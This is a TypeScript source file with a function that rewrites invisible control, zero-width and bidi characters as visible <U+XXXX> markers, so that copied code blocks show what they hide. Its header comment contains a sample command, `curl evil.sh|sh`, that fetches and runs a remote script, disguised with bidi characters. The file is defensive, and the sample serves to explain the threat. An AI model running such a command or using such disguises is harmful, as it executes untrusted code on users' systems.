// Characters a text box does not show as themselves (#2615): controls it draws as nothing, zero-width
// and format characters, and the bidi controls that reorder what is around them. With them a line can
// read `true; #;curl evil.sh|sh` and paste as `true; curl evil.sh|sh;# ` — so a block shown before it
// is copied must show them. Tab, newline and carriage return are left alone: a text box draws those.
//
// Pure: text in, the text with each one written as `<U+XXXX>` and how many there were out.

const HIDDEN_RANGES: readonly [number, number][] = [
  [0x00, 0x08],
  [0x0b, 0x0c],
  [0x0e, 0x1f],
  [0x7f, 0x9f],
  [0xad, 0xad],
  [0x061c, 0x061c],
  [0x180e, 0x180e],
  [0x200b, 0x200f],
  [0x2028, 0x202e],
  [0x2060, 0x206f],
  [0xfeff, 0xfeff],
  [0xfff9, 0xfffb],
  [0xe0000, 0xe007f],
];

export const isHiddenCharacter = (codePoint: number): boolean => HIDDEN_RANGES.some(([low, high]) => codePoint >= low && codePoint <= high);

const HEX_DIGITS = 4;
const marker = (codePoint: number): string => `<U+${codePoint.toString(16).toUpperCase().padStart(HEX_DIGITS, "0")}>`;

export interface RevealedText {
  /** The text with every hidden character written as `<U+XXXX>`. */
  shown: string;
  hidden: number;
}

export function revealHidden(text: string): RevealedText {
  const characters = [...text].map((character) => {
    const codePoint = character.codePointAt(0) ?? 0;
    return isHiddenCharacter(codePoint) ? { text: marker(codePoint), hidden: true } : { text: character, hidden: false };
  });
  return { shown: characters.map((character) => character.text).join(""), hidden: characters.filter((character) => character.hidden).length };
}
